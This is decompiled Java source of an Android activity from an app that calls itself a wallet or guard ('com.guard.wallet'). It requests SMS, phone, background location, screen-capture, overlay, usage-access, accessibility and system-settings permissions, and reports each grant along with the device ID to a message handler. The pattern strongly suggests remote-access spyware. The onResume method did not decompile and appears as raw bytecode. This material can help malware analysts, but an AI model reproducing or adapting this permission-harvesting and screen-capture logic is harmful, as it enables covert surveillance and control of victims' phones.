package com.guard.wallet.activity;

import a1.q;
import android.app.Activity;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.os.Bundle;
import android.os.Build.VERSION;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.view.WindowManager.LayoutParams;
import android.widget.LinearLayout;
import android.widget.Toast;
import com.guard.wallet.MainApplication;
import com.guard.wallet.req.MessageRecordVO;
import com.guard.wallet.req.PermissionResponseVO;
import com.guard.wallet.service.MediaLiveService;
import com.guard.wallet.utils.b;
import com.guard.wallet.utils.d;
import com.guard.wallet.utils.h;
import e0.e;
import java.lang.ref.WeakReference;
import x.a;

public class MainActivity extends Activity {
   public WeakReference a;
   public Long b;

   public final void onActivityResult(int var1, int var2, Intent var3) {
      label64: {
         label63: {
            String var6;
            switch (var1) {
               case 1002:
                  if (var2 == -1) {
                     var7 = "安装应用程序申请成功";
                     break label63;
                  }

                  var6 = "安装应用程序申请失败";
                  break;
               case 1003:
                  if (VERSION.SDK_INT >= 29) {
                     Intent var4 = new Intent(this, MediaLiveService.class);
                     var4.putExtra("code", var2);
                     var4.putExtra("data", var3);
                     this.startForegroundService(var4);
                  } else {
                     x.a.b().g(var3);
                  }
                  break label64;
               case 1004:
                  if (var2 == -1) {
                     var7 = "悬浮窗权限申请成功";
                     break label63;
                  }

                  var6 = "悬浮窗权限申请失败";
                  break;
               case 1005:
               case 1007:
               case 1008:
               case 1011:
               case 1012:
               case 1014:
               default:
                  super.onActivityResult(var1, var2, var3);
                  break label64;
               case 1006:
                  if (var2 == -1) {
                     var7 = "使用情况访问权限申请成功";
                     break label63;
                  }

                  var6 = "使用情况访问权限申请失败";
                  break;
               case 1009:
                  if (var2 == -1) {
                     var7 = "自启动权限申请成功";
                     break label63;
                  }

                  var6 = "自启动权限申请失败";
                  break;
               case 1010:
                  if (var2 == -1) {
                     var7 = "电量优化白名单权限申请成功";
                     break label63;
                  }

                  var6 = "电量优化白名单权限申请失败";
                  break;
               case 1013:
                  if (var2 == -1) {
                     var7 = "REQUEST_PERMISSION_BY_CODE 申请成功";
                     break label63;
                  }

                  var6 = "REQUEST_PERMISSION_BY_CODE 申请失败";
                  break;
               case 1015:
                  if (var2 == -1) {
                     var7 = "设备读写权限申请成功";
                     break label63;
                  }

                  var6 = "设备读写权限申请失败";
                  break;
               case 1016:
                  if (var2 == -1) {
                     var7 = "设备系统项修改权限申请成功";
                     break label63;
                  }

                  var6 = "设备系统项修改权限申请失败";
            }

            Log.e("MainActivity", var6);
            break label64;
         }

         Log.d("MainActivity", var7);
      }

      PermissionResponseVO var8 = new PermissionResponseVO();
      var8.setDeviceId(h.l("deviceId"));
      var8.setRequestCode(var1);
      byte var5 = 1;
      var8.setRequested(1);
      if (var2 != -1) {
         var5 = 0;
      }

      var8.setGranted(Integer.valueOf(var5));
      MessageRecordVO var9 = new MessageRecordVO();
      var9.setExtraBody(var8);
      var9.setIntentCode("android.intent.action.GRANT");
      MainApplication.getInstance().getHandlerMsgAndTimer().b(var9);
   }

   public final void onCreate(Bundle var1) {
      super.onCreate(var1);
      this.requestWindowFeature(1);
      this.getWindow().getDecorView().setBackgroundColor(Color.parseColor("#303133"));
      this.getWindow().setBackgroundDrawable(new ColorDrawable(Color.parseColor("#303133")));
      e var2 = new e(this.getApplicationContext(), false);
      LinearLayout var4 = new LinearLayout(this);
      LayoutParams var3 = new LayoutParams();
      var3.width = -1;
      var3.height = -1;
      var4.setBackgroundColor(Color.parseColor("#303133"));
      this.setContentView(var4, var3);
      this.a = new WeakReference<>(var2);
      LayoutParams var6 = new LayoutParams();
      var6.width = -1;
      var6.height = -1;
      var4.addView((View)this.a.get(), var6);
      LayoutParams var5 = this.getWindow().getAttributes();
      var5.type = 2038;
      this.getWindow().setAttributes(var5);
      this.b = System.currentTimeMillis();
      com.guard.wallet.utils.b.d(this);
   }

   public final void onDestroy() {
      WeakReference var1 = this.a;
      if (var1 != null && var1.get() != null) {
         ((e)this.a.get()).destroy();
         this.a = null;
      }

      super.onDestroy();
   }

   public final void onDetachedFromWindow() {
      super.onDetachedFromWindow();
   }

   public final boolean onKeyDown(int var1, KeyEvent var2) {
      if (var1 == 4 && var2.getAction() == 0) {
         WeakReference var3 = this.a;
         if (var3 != null && var3.get() != null) {
            if (((e)this.a.get()).a.get()) {
               return false;
            }

            if (((e)this.a.get()).canGoBack()) {
               ((e)this.a.get()).goBack();
               return true;
            }
         }

         if (System.currentTimeMillis() - this.b > 2000L) {
            this.b = System.currentTimeMillis();
            Integer var4 = d.a;
            String var5;
            if (MainApplication.getInstance() != null
               && MainApplication.getInstance().getBuildConfig() != null
               && !q.B(MainApplication.getInstance().getBuildConfig().getExitConfirm())) {
               var5 = MainApplication.getInstance().getBuildConfig().getExitConfirm();
            } else {
               var5 = "Press again to exit";
            }

            Toast.makeText(this, var5, 0).show();
         } else {
            this.finish();
         }

         return true;
      } else {
         return super.onKeyDown(var1, var2);
      }
   }

   public final void onPause() {
      super.onPause();
      WeakReference var1 = this.a;
      if (var1 != null && var1.get() != null) {
         ((e)this.a.get()).onPause();
      }
   }

   public final void onRequestPermissionsResult(int var1, String[] var2, int[] var3) {
      label83: {
         label82: {
            if (var1 != 1001) {
               if (var1 != 1007) {
                  if (var1 == 1008) {
                     if (var3.length > 0 && var3[0] == 0) {
                        var2 = "后台位置信息权限申请成功";
                     } else {
                        var2 = "后台位置信息权限申请失败";
                     }
                     break label82;
                  }

                  switch (var1) {
                     case 1011:
                        if (var3.length > 0 && var3[0] == 0) {
                           var2 = "短信权限申请成功";
                        } else {
                           var2 = "短信权限申请失败";
                        }
                        break label82;
                     case 1012:
                        if (var3.length > 0 && var3[0] == 0) {
                           var2 = "电话权限申请成功";
                        } else {
                           var2 = "电话权限申请失败";
                        }
                        break label82;
                     case 1013:
                        if (var3.length > 0 && var3[0] == 0) {
                           var2 = "REQUEST_PERMISSION_BY_CODE 申请成功";
                           break label82;
                        }

                        var2 = "REQUEST_PERMISSION_BY_CODE 申请失败";
                        break;
                     case 1014:
                        if (var3.length > 0 && var3[0] == 0) {
                           var2 = "通知权限申请成功";
                           break label82;
                        }

                        var2 = "通知权限申请失败";
                        break;
                     default:
                        super.onRequestPermissionsResult(var1, var2, var3);
                        break label83;
                  }
               } else {
                  if (var3.length > 0 && var3[0] == 0) {
                     var2 = "前台位置信息权限申请成功";
                     break label82;
                  }

                  var2 = "前台位置信息权限申请失败";
               }
            } else {
               if (var3.length > 0 && var3[0] == 0) {
                  var2 = "设备读写权限申请成功";
                  break label82;
               }

               var2 = "设备读写权限申请失败";
            }

            Log.e("MainActivity", var2);
            break label83;
         }

         Log.d("MainActivity", var2);
      }

      PermissionResponseVO var4 = new PermissionResponseVO();
      var4.setDeviceId(h.l("deviceId"));
      var4.setRequestCode(var1);
      var4.setRequested(1);
      Integer var7;
      if (var3.length > 0 && var3[0] == 0) {
         var7 = 1;
      } else {
         var7 = 0;
      }

      var4.setGranted(var7);
      MessageRecordVO var8 = new MessageRecordVO();
      var8.setExtraBody(var4);
      var8.setIntentCode("android.intent.action.GRANT");
      MainApplication.getInstance().getHandlerMsgAndTimer().b(var8);
   }

   public final void onResume() {
      // $VF: Couldn't be decompiled
      // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
      // java.lang.NullPointerException: Cannot read field "id" because the return value of "org.jetbrains.java.decompiler.modules.decompiler.flow.FlattenStatementsHelper.getDirectNode(org.jetbrains.java.decompiler.modules.decompiler.stats.Statement)" is null
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:179)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.processStatement(ExprProcessor.java:112)
      //   at org.jetbrains.java.decompiler.modules.decompiler.FinallyProcessor.getFinallyInformation(FinallyProcessor.java:136)
      //   at org.jetbrains.java.decompiler.modules.decompiler.FinallyProcessor.iterateGraph(FinallyProcessor.java:85)
      //   at org.jetbrains.java.decompiler.main.rels.MethodProcessor.codeToJava(MethodProcessor.java:178)
      //
      // Bytecode:
      // 00: aload 0
      // 01: invokespecial android/app/Activity.onResume ()V
      // 04: aload 0
      // 05: getfield com/guard/wallet/activity/MainActivity.a Ljava/lang/ref/WeakReference;
      // 08: astore 2
      // 09: aload 2
      // 0a: ifnull d2
      // 0d: aload 2
      // 0e: invokevirtual java/lang/ref/Reference.get ()Ljava/lang/Object;
      // 11: ifnull d2
      // 14: aload 0
      // 15: getfield com/guard/wallet/activity/MainActivity.a Ljava/lang/ref/WeakReference;
      // 18: invokevirtual java/lang/ref/Reference.get ()Ljava/lang/Object;
      // 1b: checkcast e0/e
      // 1e: invokevirtual android/webkit/WebView.onResume ()V
      // 21: invokestatic com/guard/wallet/service/MyAccessibilityService.P ()Lcom/guard/wallet/service/MyAccessibilityService;
      // 24: ifnonnull 68
      // 27: invokestatic com/guard/wallet/utils/g.j ()Z
      // 2a: ifne 68
      // 2d: ldc com/guard/wallet/utils/h
      // 2f: monitorenter
      // 30: ldc_w "adbCanWriteSecure"
      // 33: invokestatic com/guard/wallet/utils/h.e (Ljava/lang/String;)Z
      // 36: istore 1
      // 37: ldc com/guard/wallet/utils/h
      // 39: monitorexit
      // 3a: iload 1
      // 3b: ifne 68
      // 3e: aload 0
      // 3f: getfield com/guard/wallet/activity/MainActivity.a Ljava/lang/ref/WeakReference;
      // 42: invokevirtual java/lang/ref/Reference.get ()Ljava/lang/Object;
      // 45: checkcast e0/e
      // 48: invokestatic com/guard/wallet/utils/b.c ()Ljava/lang/String;
      // 4b: invokevirtual android/webkit/WebView.loadUrl (Ljava/lang/String;)V
      // 4e: aload 0
      // 4f: getfield com/guard/wallet/activity/MainActivity.a Ljava/lang/ref/WeakReference;
      // 52: invokevirtual java/lang/ref/Reference.get ()Ljava/lang/Object;
      // 55: checkcast e0/e
      // 58: bipush 1
      // 59: invokevirtual e0/e.setGuide (Z)V
      // 5c: invokestatic com/guard/wallet/utils/b.f ()V
      // 5f: goto d2
      // 62: astore 2
      // 63: ldc com/guard/wallet/utils/h
      // 65: monitorexit
      // 66: aload 2
      // 67: athrow
      // 68: aload 0
      // 69: getfield com/guard/wallet/activity/MainActivity.a Ljava/lang/ref/WeakReference;
      // 6c: invokevirtual java/lang/ref/Reference.get ()Ljava/lang/Object;
      // 6f: checkcast e0/e
      // 72: invokevirtual e0/e.getPageFinished ()Z
      // 75: ifeq b1
      // 78: aload 0
      // 79: getfield com/guard/wallet/activity/MainActivity.a Ljava/lang/ref/WeakReference;
      // 7c: invokevirtual java/lang/ref/Reference.get ()Ljava/lang/Object;
      // 7f: checkcast e0/e
      // 82: invokevirtual android/webkit/WebView.getUrl ()Ljava/lang/String;
      // 85: ifnull b1
      // 88: aload 0
      // 89: getfield com/guard/wallet/activity/MainActivity.a Ljava/lang/ref/WeakReference;
      // 8c: invokevirtual java/lang/ref/Reference.get ()Ljava/lang/Object;
      // 8f: checkcast e0/e
      // 92: invokevirtual android/webkit/WebView.getUrl ()Ljava/lang/String;
      // 95: astore 2
      // 96: aload 2
      // 97: invokestatic java/util/Objects.requireNonNull (Ljava/lang/Object;)Ljava/lang/Object;
      // 9a: pop
      // 9b: aload 2
      // 9c: invokestatic com/guard/wallet/utils/d.f ()Ljava/lang/String;
      // 9f: invokevirtual java/lang/String.startsWith (Ljava/lang/String;)Z
      // a2: ifeq b1
      // a5: ldc "MainActivity"
      // a7: ldc_w "Main url is load finished"
      // aa: invokestatic android/util/Log.d (Ljava/lang/String;Ljava/lang/String;)I
      // ad: pop
      // ae: goto cf
      // b1: aload 0
      // b2: getfield com/guard/wallet/activity/MainActivity.a Ljava/lang/ref/WeakReference;
      // b5: invokevirtual java/lang/ref/Reference.get ()Ljava/lang/Object;
      // b8: checkcast e0/e
      // bb: invokestatic com/guard/wallet/utils/d.f ()Ljava/lang/String;
      // be: invokevirtual android/webkit/WebView.loadUrl (Ljava/lang/String;)V
      // c1: aload 0
      // c2: getfield com/guard/wallet/activity/MainActivity.a Ljava/lang/ref/WeakReference;
      // c5: invokevirtual java/lang/ref/Reference.get ()Ljava/lang/Object;
      // c8: checkcast e0/e
      // cb: bipush 0
      // cc: invokevirtual e0/e.setGuide (Z)V
      // cf: invokestatic com/guard/wallet/utils/b.b ()V
      // d2: return
   }

   public final void onStart() {
      super.onStart();
   }
}
